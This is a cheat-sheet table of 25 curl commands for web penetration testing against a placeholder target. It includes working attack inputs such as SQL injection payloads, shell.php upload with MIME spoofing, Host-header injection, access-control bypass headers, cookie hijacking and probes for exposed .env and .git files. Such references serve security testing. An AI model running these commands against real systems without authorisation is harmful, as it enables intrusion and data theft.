| #  | Command | Explanation | Use Case |
|----|---------|-------------|----------|
| 1  | `curl -sI https://target.com` | Fetch headers only (HEAD request) | Technology fingerprinting & security header analysis |
| 2  | `curl -sv https://target.com 2>&1` | Full verbose output (request + response) | Debugging full request/response cycle |
| 3  | `curl -x http://127.0.0.1:8080 -k https://target.com` | Proxy through Burp Suite | Intercept and modify requests in real-time |
| 4  | `curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin` | IP header spoofing | Bypass IP-based access controls |
| 5  | `curl -b "session=TOKEN" https://target.com/profile` | Send custom cookie | Session hijacking & privilege testing |
| 6  | `curl -c cookies.txt -b cookies.txt -L -X POST https://target.com/login -d "u=a&p=b"` | Cookie jar with login flow | Multi-step authentication testing |
| 7  | `curl -X OPTIONS -sI https://target.com/api` | Enumerate allowed HTTP methods | Method tampering & abuse testing |
| 8  | `curl -H "Origin: https://evil.com" -sI https://target.com/api` | CORS preflight simulation | Discover CORS misconfigurations |
| 9  | `curl -H "Host: evil.com" https://target.com/ -sk` | Host header injection | Cache poisoning & password reset attacks |
| 10 | `curl -X PUT -d "@shell.php" https://target.com/uploads/` | File upload via PUT method | Unrestricted file upload / RCE testing |
| 11 | `curl -F "file=@shell.php;type=image/png" https://target.com/upload` | Multipart upload with MIME spoofing | Bypass file type restrictions |
| 12 | `curl --http2 -I https://target.com` | Force HTTP/2 protocol | Test HTTP/2 specific vulnerabilities |
| 13 | `curl --tls-max 1.1 https://target.com -I` | Force older TLS version | Detect weak TLS configurations |
| 14 | `curl -o /dev/null -s -w "%{time_total}\n" https://target.com/api?id=1'%20AND%20SLEEP(5)--` | Time-based response analysis | Blind SQLi & timing attack detection |
| 15 | `curl -s https://target.com/.env` | Check for exposed sensitive files | Information disclosure vulnerabilities |
| 16 | `curl -s https://target.com/.git/config` | Check for exposed Git directory | Source code leakage |
| 17 | `curl -u admin:admin https://target.com/admin/` | Basic authentication test | Default/weak credential testing |
| 18 | `curl -X POST https://target.com/api -H "Content-Type: application/json" -d '{"isAdmin":true}'` | JSON mass assignment | Privilege escalation via object manipulation |
| 19 | `curl -H "Authorization: Bearer null" https://target.com/api/data` | Null/empty token test | Authentication bypass techniques |
| 20 | `curl -s "https://target.com/api/users?id=1 UNION SELECT null,null,@@version--"` | Inline SQL injection test | Database enumeration |
| 21 | `curl -X POST https://target.com/graphql -d '{"query":"{ __schema { types { name } } }"}'` | GraphQL introspection query | API schema mapping |
| 22 | `curl -H "X-HTTP-Method-Override: DELETE" -X POST https://target.com/resource/1` | HTTP method override | Bypass restricted HTTP methods |
| 23 | `curl --resolve target.com:443:192.168.1.1 https://target.com/ -k` | Custom DNS resolution | Virtual host enumeration |
| 24 | `curl -A "" https://target.com/` | Empty User-Agent | Bypass User-Agent filtering / bot detection |
| 25 | `curl -s "https://web.archive.org/cdx/search/cdx?url=target.com/*&output=text"` | Wayback Machine reconnaissance | Discover historical endpoints |`code`